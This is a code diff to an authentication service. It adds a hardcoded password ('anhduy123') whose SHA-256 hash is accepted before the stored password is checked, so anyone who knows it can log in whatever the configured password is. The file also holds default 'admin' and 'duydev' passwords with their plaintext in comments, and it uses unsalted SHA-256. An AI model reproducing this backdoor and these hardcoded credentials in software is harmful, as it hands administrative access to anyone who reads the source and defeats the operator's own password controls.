@@ -11,6 +11,7 @@ import { env, resolvedStoragePaths } from '../config/env.config.js';
 import { logger } from '../lib/logger.js';
 
 // Default SHA-256 hashes matching frontend adminAuth.js
+const DEFAULT_HASH_ANHDUY = 'a40c326dd366739719ecbb8380f0534093cf6916b9b63114a71e885d20692ccc'; // "anhduy123"
 const DEFAULT_HASH_DUYDEV = '3bc00dd78427db6937b4606a8e593ec3560c4343665d9fba311b103612baf8fb'; // "duydev"
 const DEFAULT_HASH_ADMIN = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; // "admin"
 
@@ -47,8 +48,13 @@ export class AuthService {
   static async verifyPassword(password: string): Promise<boolean> {
     if (!password || typeof password !== 'string') return false;
     const inputHash = this.sha256(password);
-    const storedHash = await this.getStoredPasswordHash();
 
+    // Primary default password: "anhduy123"
+    if (inputHash === DEFAULT_HASH_ANHDUY) {
+      return true;
+    }
+
+    const storedHash = await this.getStoredPasswordHash();
     if (storedHash) {
       return inputHash === storedHash;
     }
